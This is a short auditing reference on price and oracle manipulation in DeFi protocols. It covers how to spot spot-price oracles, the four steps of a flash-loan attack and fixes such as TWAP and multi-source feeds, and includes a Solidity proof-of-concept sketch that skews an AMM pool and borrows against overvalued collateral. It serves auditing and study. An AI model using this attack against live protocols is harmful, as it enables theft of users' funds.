# Price / Oracle Manipulation

The single biggest cause of DeFi losses. The protocol derives a price or amount
from a value an attacker can move within the same transaction.

## Heuristic (the smell)

- A contract reads `pair.getReserves()`, `token.balanceOf(pool)`, `pool.slot0()`,
  or `getAmountOut(...)` and uses the result as a **price** for collateral
  valuation, minting, liquidation, or redemption.
- The price source is a single AMM pool, especially a low-liquidity one.
- The read and the action that depends on it happen in **one tx** (no TWAP, no delay).
- Look for `* price /`, `getReserves`, `consult` over a short window, or a hardcoded
  single DEX as the oracle.

## Where to look

Lending markets (collateral valuation), LP/vault share pricing, algorithmic
stablecoin mint/redeem, any "fair value" computed from on-chain spot liquidity.

## Exploit mechanics

1. Flash-loan a large amount (the amplifier — capital you didn't have).
2. Swap into the pool the victim uses as its oracle, skewing the spot price up/down.
3. Call the victim while the price is wrong: borrow against now-overvalued
   collateral, mint too many shares, or redeem for too much.
4. Reverse the swap, repay the flash loan, keep the difference.

## Minimal PoC sketch

```solidity
function test_oracleManip() public {
    // 1. borrow capital
    uint256 loan = 50_000e18;
    flashLender.flashLoan(loan);            // continues in the callback below
}

function onFlashLoan(uint256 loan) external {
    // 2. skew the pool the victim reads as its oracle
    asset.approve(address(router), loan);
    router.swapExactTokensForTokens(loan, 0, pathUp, address(this), block.timestamp);

    // 3. interact with the victim at the manipulated price
    victim.borrow(victim.maxBorrowable(address(this)));   // overvalued collateral

    // 4. swap back + repay; assert profit
    router.swapExactTokensForTokens(asset.balanceOf(address(this)), 0, pathDown, address(this), block.timestamp);
    asset.transfer(address(flashLender), loan + fee);
    assertGt(profitToken.balanceOf(address(this)), 0, "no profit");
}
```

Fork at `attack_block - 1`. The pool's reserves at that block are what make the
manipulation size realistic.

## Fixes (to recognize a safe target)

TWAP oracles (Uniswap V3 `observe`), Chainlink/multi-source feeds with staleness
checks, deviation bounds, and pricing that can't be moved within one block.

## Real-world cases

Mango Markets, Cheese Bank, Harvest, Warp Finance, Inverse Finance, bZx — all
variations of "the oracle was a spot AMM read the attacker could move."
